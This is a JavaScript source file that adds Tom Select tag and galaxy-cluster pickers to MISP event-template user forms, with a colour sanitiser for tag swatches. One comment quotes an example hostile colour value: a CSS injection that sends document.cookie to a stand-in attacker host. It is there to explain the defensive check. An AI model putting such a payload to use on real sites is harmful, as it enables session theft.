/*
 * MISP Event Templates — Overmind user-form Tom Select pickers
 * (Phase 3.4.2).
 *
 * Additive enhancement layered on top of event-templates/user_form.js.
 * Keeps user_form.js unchanged: writes the user's tag / galaxy
 * selections into the same hidden .et-value[data-et-csv="1"] inputs
 * the submit flow already reads on POST to /instantiate.
 *
 *   - Tag picker  : preloads /tags/index.json once on first focus,
 *                   filters client-side by data-et-restrict-taxonomies.
 *   - Galaxy picker: async-loads /galaxy_clusters/search?galaxy_type=…
 *                   on each keystroke (debounced by Tom Select).
 *                   Multi-galaxy fields with several types fan out to
 *                   one search request per type and merge results.
 */
(function () {
    'use strict';

    if (typeof window.TomSelect === 'undefined') { return; }

    const cfg = window.ET_USER_FORM_CONFIG || {};
    const BASE = cfg.baseurl || '';

    // ---------- shared bits ----------

    function csvSync($valueInput, values) {
        $valueInput.value = (values || []).join(', ');
        $valueInput.dispatchEvent(new Event('input', {bubbles: true}));
    }
    function readInitialCsv($valueInput) {
        return ($valueInput.value || '')
            .split(',')
            .map((s) => s.trim())
            .filter(Boolean);
    }
    function parseRestrictAttr($field, attr) {
        const raw = $field.getAttribute(attr) || '[]';
        try {
            const v = JSON.parse(raw);
            return Array.isArray(v) ? v : [];
        } catch (e) {
            return [];
        }
    }
    // Tag.colour comes from the DB (settable by anyone with tag-edit
    // permission). Restrict to hex literals + a small set of named
    // colour keywords so a hostile colour like
    //   "red; background-image:url(http://evil.example/exfil?c="+document.cookie+")"
    // can't smuggle declarations into the swatch's style attribute.
    function safeColour(input) {
        const fallback = '#777';
        if (typeof input !== 'string') { return fallback; }
        const s = input.trim();
        if (/^#(?:[0-9a-fA-F]{3,4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/.test(s)) {
            return s;
        }
        if (/^[a-zA-Z]{3,32}$/.test(s)) {
            return s;
        }
        return fallback;
    }

    // ---------- tag picker ----------

    let tagCachePromise = null;
    function loadTagCache() {
        if (tagCachePromise) { return tagCachePromise; }
        tagCachePromise = fetch(BASE + '/tags/index.json', {
            credentials: 'same-origin',
            headers: {
                'Accept': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            }
        }).then((r) => {
            if (!r.ok) { throw new Error('HTTP ' + r.status); }
            return r.json();
        }).then((payload) => {
            const rows = Array.isArray(payload)
                ? payload
                : (payload && Array.isArray(payload.Tag) ? payload.Tag : []);
            return rows.map((row) => {
                const t = row.Tag || row;
                return {
                    name: (t.name || '').toString(),
                    colour: (t.colour || '').toString()
                };
            }).filter((t) => t.name !== '');
        });
        return tagCachePromise;
    }
    function tagMatchesRestrict(name, restrict) {
        if (!restrict.length) { return true; }
        return restrict.some((tax) => name.indexOf(tax + ':') === 0);
    }

    function textColour(hex) {
        const s = safeColour(hex);
        if (s.charAt(0) !== '#' || s.length < 7) { return 'black'; }
        const r = parseInt(s.slice(1, 3), 16);
        const g = parseInt(s.slice(3, 5), 16);
        const b = parseInt(s.slice(5, 7), 16);
        return ((2 * r) + b + (3 * g)) / 6 < 127 ? 'white' : 'black';
    }
    function badgeStyle(colour) {
        const col = safeColour(colour);
        return 'background-color:' + col + '; color:' + textColour(col) + ';'
            + ' filter: drop-shadow(-1px 3px 2px rgba(50, 50, 0, 0.5));'
            + ' background-image: linear-gradient(145deg, rgba(255,255,255,0.25) 0%,'
            + ' rgba(255,255,255,0.05) 40%, rgba(0,0,0,0.05) 100%);'
            + ' text-align:left; white-space:normal; word-wrap:break-word;';
    }

    // A TLP tag states one sensitivity level: picking a second one replaces the
    // first rather than stacking a contradiction.
    function isTlp(name) {
        return /^tlp:/i.test(name || '');
    }

    function attachTagPicker($field) {
        const $select = $field.querySelector('.et-tag-select');
        const $value = $field.querySelector('.et-value');
        const $selected = $field.querySelector('.et-tag-selected');
        const $empty = $field.querySelector('.et-tag-selected-empty');
        if (!$select || !$value) { return; }
        const multiple = $field.getAttribute('data-et-multiple') === '1';
        const restrict = parseRestrictAttr(
            $field, 'data-et-restrict-taxonomies'
        );

        // name -> colour, filled in as the cache arrives.
        const colours = {};
        let selected = readInitialCsv($value);

        function render() {
            if ($empty) { $empty.classList.toggle('d-none', selected.length > 0); }
            if (!$selected) { return; }
            $selected.innerHTML = '';
            selected.forEach(function (name) {
                const badge = document.createElement('span');
                badge.className = 'badge me-1 mb-1 d-inline-flex align-items-center gap-1';
                badge.style.cssText = badgeStyle(colours[name]);
                badge.appendChild(document.createTextNode(name));

                const remove = document.createElement('i');
                remove.className = 'fas fa-times';
                remove.style.cssText = 'cursor:pointer; opacity:.8;';
                remove.setAttribute('role', 'button');
                remove.setAttribute('aria-label', 'Remove');
                remove.addEventListener('click', function () {
                    selected = selected.filter(function (n) { return n !== name; });
                    render();
                    csvSync($value, selected);
                });

                badge.appendChild(remove);
                $selected.appendChild(badge);
            });
        }

        function addTag(name) {
            if (!name) { return; }
            if (!multiple) {
                selected = [name];
            } else {
                // One TLP level at a time; everything else just dedupes.
                if (isTlp(name)) {
                    selected = selected.filter(function (n) { return !isTlp(n); });
                }
                if (selected.indexOf(name) === -1) { selected.push(name); }
            }
            render();
            csvSync($value, selected);
        }

        function renderOption(data, escape) {
            const swatch = '<span style="display:inline-block;width:10px;'
                + 'height:10px;border-radius:2px;flex-shrink:0;'
                + 'border:1px solid rgba(0,0,0,0.15);background:'
                + escape(safeColour(data.colour)) + ';"></span>';
            return '<div class="d-flex align-items-center gap-2 py-1">'
                + swatch + '<span class="text-truncate">'
                + escape(data.name) + '</span></div>';
        }

        const ts = new window.TomSelect($select, {
            valueField: 'name',
            labelField: 'name',
            searchField: ['name'],
            // The box only ever holds the term being picked — the selection
            // itself is the badge list below.
            maxItems: 1,
            maxOptions: 200,
            create: false,
            preload: 'focus',
            // The list is cached client-side, so an empty query is cheap and
            // useful: clearing the box shows the whole (restricted) list again,
            // where Tom Select's default only loads for a non-empty term.
            shouldLoad: () => true,
            render: {option: renderOption, item: renderOption},
            load(query, callback) {
                loadTagCache().then((rows) => {
                    const term = (query || '').toLowerCase();
                    const filtered = rows
                        .filter((r) => tagMatchesRestrict(r.name, restrict))
                        .filter((r) => !term ||
                            r.name.toLowerCase().indexOf(term) !== -1);
                    filtered.forEach((r) => { colours[r.name] = r.colour; });
                    // Colours for values restored from the CSV arrive with the
                    // cache, so repaint what is already selected.
                    render();
                    callback(filtered.slice(0, 200));
                }).catch(() => callback());
            },
            onItemAdd(value) {
                addTag(value);
                // Free the box for the next search, like the picker modal does.
                window.setTimeout(() => { ts.clear(true); ts.blur(); }, 0);
            }
        });

        render();
        return ts;
    }

    // ---------- galaxy cluster picker ----------

    function attachGalaxyPicker($field) {
        const $select = $field.querySelector('.et-galaxy-select');
        const $value = $field.querySelector('.et-value');
        if (!$select || !$value) { return; }
        const multiple = $field.getAttribute('data-et-multiple') === '1';
        const types = parseRestrictAttr(
            $field, 'data-et-restrict-galaxy-types'
        );
        const initial = readInitialCsv($value);

        const ts = new window.TomSelect($select, {
            valueField: 'value',
            labelField: 'label',
            searchField: ['label', 'value', 'description'],
            options: initial.map((v) => ({value: v, label: v})),
            items: initial,
            maxItems: multiple ? null : 1,
            maxOptions: 200,
            create: false,
            plugins: multiple ? ['remove_button'] : [],
            placeholder: multiple
                ? 'Search galaxy clusters…'
                : 'Pick a galaxy cluster…',
            load(query, callback) {
                if (!types.length) {
                    // Without a galaxy_type restriction the search
                    // endpoint requires one; skip silently rather than
                    // 400 on every keystroke. The PRD enforces a
                    // restriction at the builder level.
                    callback();
                    return;
                }
                Promise.all(types.map((type) =>
                    fetch(BASE + '/galaxy_clusters/search?galaxy_type=' +
                          encodeURIComponent(type) +
                          (query ? '&q=' + encodeURIComponent(query) : ''), {
                        credentials: 'same-origin',
                        headers: {
                            'Accept': 'application/json',
                            'X-Requested-With': 'XMLHttpRequest'
                        }
                    }).then((r) => r.ok ? r.json() : []).catch(() => [])
                )).then((results) => {
                    const seen = {};
                    const merged = [];
                    results.forEach((rows) => {
                        (rows || []).forEach((row) => {
                            if (!row || !row.value) { return; }
                            if (seen[row.value]) { return; }
                            seen[row.value] = true;
                            merged.push(row);
                        });
                    });
                    callback(merged);
                });
            },
            render: {
                option(data, escape) {
                    const desc = data.description
                        ? ('<div style="color:#888;font-size:11px;' +
                           'max-height:3em;overflow:hidden;">' +
                           escape(data.description) + '</div>')
                        : '';
                    return '<div><strong>' + escape(data.label) +
                        '</strong>' + desc + '</div>';
                }
            },
            onChange(values) {
                const arr = Array.isArray(values)
                    ? values
                    : (values ? [values] : []);
                csvSync($value, arr);
            }
        });
        return ts;
    }

    // ---------- bootstrap on DOMContentLoaded ----------

    function attachAll() {
        document.querySelectorAll('.et-tag-field').forEach(attachTagPicker);
        document.querySelectorAll('.et-galaxy-field').forEach(attachGalaxyPicker);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', attachAll);
    } else {
        attachAll();
    }
})();
